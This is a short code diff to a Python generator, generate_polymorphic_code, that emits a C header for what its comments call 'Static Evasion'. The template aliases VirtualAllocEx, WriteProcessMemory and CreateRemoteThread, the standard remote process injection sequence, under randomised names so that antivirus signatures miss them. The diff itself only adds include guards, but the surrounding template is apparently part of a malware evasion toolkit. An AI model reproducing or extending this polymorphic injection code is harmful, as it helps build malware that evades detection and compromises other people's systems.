@@ -47,6 +47,9 @@ def generate_polymorphic_code() -> Dict[str, Any]:
 // Layer 1 – Static Evasion
 // Symbol table: alloc={alloc_fn}, write={write_fn}, exec={exec_fn}
 
+#ifndef PHANTOM_POLYMORPHIC_INCLUDED
+#define PHANTOM_POLYMORPHIC_INCLUDED
+
 #define {alloc_fn}_IMPL VirtualAllocEx
 #define {write_fn}_IMPL WriteProcessMemory
 #define {exec_fn}_IMPL  CreateRemoteThread
@@ -68,6 +71,8 @@ static inline HANDLE {exec_fn}(HANDLE h, LPVOID start) {{
     return {exec_fn}_IMPL(h, NULL, 0,
                           (LPTHREAD_START_ROUTINE)start, NULL, 0, NULL);
 }}
+
+#endif /* PHANTOM_POLYMORPHIC_INCLUDED */
 """
 
     return {
